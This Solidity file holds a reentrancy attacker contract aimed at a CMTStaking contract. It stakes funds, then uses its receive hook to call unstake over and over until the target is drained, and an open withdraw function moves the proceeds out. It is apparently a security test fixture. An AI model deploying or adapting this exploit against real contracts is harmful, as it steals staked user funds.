// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface CMTStaking {
    function stake(address validatorAddr) external payable;

    function unstake(
        address validatorAddr,
        uint256 recordIndex,
        address payable recipient
    ) external;
}

contract ReentrancyAttacker {
    event Log(uint256 receiveAmount, uint256 targetBalance);

    address target;
    address validatorAddr;
    uint256 recordIndex;

    receive() external payable {
        uint256 amount = msg.value;
        uint256 targetBalance = target.balance;
        emit Log(amount, targetBalance);

        if (targetBalance >= amount) {
            attack(recordIndex);
        }
    }

    function stake(address _target, address _validatorAddr) external payable {
        target = _target;
        validatorAddr = _validatorAddr;
        CMTStaking(target).stake{value: msg.value}(validatorAddr);
    }

    function attack(uint256 _recordIndex) public {
        recordIndex = _recordIndex;

        CMTStaking(target).unstake(
            validatorAddr,
            recordIndex,
            payable(address(this))
        );
    }

    // pretend this is a ownerOnly function
    function withdraw(address payable to) external {
        to.transfer(address(this).balance);
    }
}